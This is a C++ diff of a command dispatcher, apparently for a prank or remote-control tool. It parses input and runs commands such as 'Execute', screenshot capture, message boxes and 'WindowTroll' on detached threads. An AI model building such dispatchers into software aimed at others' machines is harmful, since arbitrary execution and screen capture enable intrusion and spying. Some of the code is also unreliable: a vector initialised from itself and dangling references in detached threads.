@@ -1,57 +1,114 @@
 #include "CommandHandler.h"
 
-std::vector<std::string> CommandHandler::cleanFunctions(const std::string& input)
+CommandHandler::CommandHandler()
 {
-    std::vector<std::string> result;
-    std::istringstream iss(input);
+    device::print("[Command Handler] [+] Created instance!");
+}
+
+CommandHandler::~CommandHandler()
+{
+    device::print("[Command Handler] [+] Destroyed instance!");
+}
+
+void CommandHandler::setInput(std::string input)
+{
+    rawInput = input;
+}
+
+void CommandHandler::clean()
+{
+    device::print("[Command Handler] [+] Cleaning input!");
+    std::istringstream iss(rawInput);
     std::string token;
 
     while (std::getline(iss, token, '\''))
     {
-        if (!token.empty() && token != " ")
+        token.erase(std::remove_if(token.begin(), token.end(), ::isspace), token.end());
+
+        if (!token.empty())
         {
-            result.push_back(token);
+            device::print("[Command Handler] [+] Token: " + token + "");
+            args.push_back(token);
         }
     }
-
-    return result;
+    //std::cout << args[0] << "A" << args[1] << "";
 }
 
-void CommandHandler::callFunction(const std::vector<std::string>& input)
+void CommandHandler::callFunction()
 {
-    /*
-        For now we will just do the basic if clauses. Too lazy to figure out function calling from string rn
-    */
+    bool x = false;
+    clean();
+    device::print("[Command Handler] [+] Calling function!");
 
-    std::cout << "DEBUG: " << input[0] << "SPACE\n";
-    if (input[0] == "Message ")
+    if (args[0] == "Message")
     {
-        commands::showMessageBox({ input[1], input[2] });
-        printf("Called showMessageBox('% s', '% s')\n", input[1], input[2]);
+        std::vector<std::string> args = {args[1], args[2]};
+        std::thread t(commands::showMessageBox, std::ref(args));
+        t.detach();
+        x = true;
     }
 
-    if (input[0] == "Execute ")
+    if (args[0] == "Execute")
     {
-        commands::execute({input[1]});
+        std::thread t(commands::execute, std::ref(args[1]));
+        t.detach();
+        x = true;
     }
 
-    if (input[0] == "Cringe ")
+    if (args[0] == "Cringe")
     {
-        commands::cringe();
+        std::thread t(commands::cringe);
+        t.detach();
+        x = true;
     }
 
-    if (input[0] == "screentest ")
+    if (args[0] == "screentest")
     {
-        capture::screenshot();
+        std::thread t(commands::Screenshot_C);
+        t.detach();
+        x = true;
+    }
+    
+    if(args[0] == "randomPixel")
+    {
+        std::thread t(commands::randomPixel, std::stoi(args[1]), std::stoi(args[2]), 10);
+        t.detach();
+        x = true;
     }
 
-    if(input[0] == "kys ")
+    if(args[0] == "WindowTroll")
     {
-        commands::KillYourSelf();
+        std::thread t(commands::WindowTroll);
+        t.detach();
+        x = true;
     }
 
-    if(input[0] == "Exit ")
+    if(args[0] == "Exit")
     {
         commands::StopProcess();
     }
+
+    if(x == false)
+    {
+        device::print("[Command Handler] [!] Command not found!");
+    }
+}
+
+void CommandHandler::DebugPrint()
+{
+    if(Debug)
+    {
+        std::cout << "[+] Called  with args -> ";
+        for(int i = 0; i < static_cast<int>(args.size()); i++)
+        {
+            std::cout << args[i] << " ";
+        }
+        std::cout << "";
+    }
+}
+
+void CommandHandler::clear()
+{
+    args.clear();
+    rawInput.clear();
 }
